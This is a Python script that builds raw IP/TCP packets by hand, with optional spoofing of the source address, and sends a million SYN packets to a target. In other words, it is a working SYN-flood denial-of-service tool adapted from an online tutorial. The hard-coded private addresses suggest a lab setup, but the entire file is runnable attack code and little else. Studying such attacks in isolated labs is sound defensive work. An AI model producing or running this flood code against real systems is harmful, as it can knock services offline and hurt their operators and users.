'''
	Syn flood program in python using raw sockets (Linux)
'''

# some imports
import socket, sys
from struct import *
#with help of this site #https://www.binarytides.com/python-syn-flood-program-raw-sockets-linux/




# checksum functions needed for calculation checksum
def checksum(msg):
    s = 0
    # loop taking 2 characters at a time
    for i in range(0, len(msg), 2):
        w = ((msg[i]) << 8) + ((msg[i + 1]))
        s = s + w

    s = (s >> 16) + (s & 0xffff);
    # s = s + (s >> 16);
    # complement and mask to 4 byte short
    s = ~s & 0xffff

    return s


def creat(source_ip,dest_ip):

    # create a raw socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    except socket.error as msg:
        print('Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1])
        sys.exit()

    # tell kernel not to put in headers, since we are providing it
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    # now start constructing the packet
    packet = '';

    # ip header fields
    ihl = 5
    version = 4
    tos = 0
    tot_len = 20 + 20  # python seems to correctly fill the total length, dont know how ??
    id = 54321  # Id of this packet
    frag_off = 0
    ttl = 255
    protocol = socket.IPPROTO_TCP
    check = 10  # python seems to correctly fill the checksum
    saddr = socket.inet_aton(source_ip)  # Spoof the source ip address if you want to
    daddr = socket.inet_aton(dest_ip)

    ihl_version = (version << 4) + ihl

    # the ! in the pack format string means network order
    ip_header = pack('!BBHHHBBH4s4s', ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)

    # tcp header fields
    source = 1234  # source port
    dest = 80  # destination port
    seq = 0
    ack_seq = 0
    doff = 5  # 4 bit field, size of tcp header, 5 * 4 = 20 bytes
    # tcp flags
    fin = 0
    syn = 1
    rst = 0
    psh = 0
    ack = 0
    urg = 0
    window = socket.htons(5840)  # maximum allowed window size
    check = 0
    urg_ptr = 0

    offset_res = (doff << 4) + 0
    tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)

    # the ! in the pack format string means network order
    tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags, window, check, urg_ptr)

    # pseudo header fields
    source_address = socket.inet_aton(source_ip)
    dest_address = socket.inet_aton(dest_ip)
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = len(tcp_header)

    psh = pack('!4s4sBBH', source_address, dest_address, placeholder, protocol, tcp_length);
    psh = psh + tcp_header

    tcp_checksum = checksum(psh)

    # make the tcp header again and fill the correct checksum
    tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags, window, tcp_checksum, urg_ptr)

    # final full packet - syn packets dont have any data
    packet = ip_header + tcp_header

    return s,packet


def syn_flood(src,dst):
    iterations = 100
    batch = 10000
    s,packet= creat(src,dst)
    for i in range(iterations):
        for b in range (batch):
            print(f"i {i} , b {b}")
            s.sendto(packet, (dst, 0))  # put this in a loop if you want to flood the target



if __name__ == '__main__':
    src = "10.0.2.15"
    dst = "10.0.2.5"
    syn_flood(src,dst)